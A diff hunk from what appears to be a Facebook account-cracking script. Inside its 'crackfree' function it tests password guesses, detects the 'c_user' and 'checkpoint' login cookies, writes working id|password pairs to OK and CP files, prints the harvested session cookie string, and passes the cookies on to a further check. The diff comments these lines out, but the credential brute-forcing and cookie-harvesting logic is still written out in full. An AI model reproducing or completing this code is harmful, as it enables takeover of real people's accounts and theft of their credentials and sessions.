@@ -829,24 +829,24 @@ def crackfree(idf,pwv):
 			#if "checkpoint" in po.cookies.get_dict().keys():
 				#print(f'\r{K}>> {idf}|{pw}{N}')     
 				#os.popen('play-audio .cp.mp3')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
-				cp+=1
-				break
+				#open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				#akun.append(idf+'|'+pw)
+				#cp+=1
+				#break
 			#elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
-				os.popen('play-audio .ok.mp3')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				cek_apk(session,coki)
-				break
+				#ok+=1
+				#coki=po.cookies.get_dict()
+				#kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				#print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
+				#os.popen('play-audio .ok.mp3')
+				#open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				#cek_apk(session,coki)
+				#break
 				
 			#else:
-				continue
+				#continue
 		#except requests.exceptions.ConnectionError:
-			time.sleep(31)
+			#time.sleep(31)
 	#loop+=1
 
 #---------------------[ METHODE-TOUCH-3 ]---------------------#
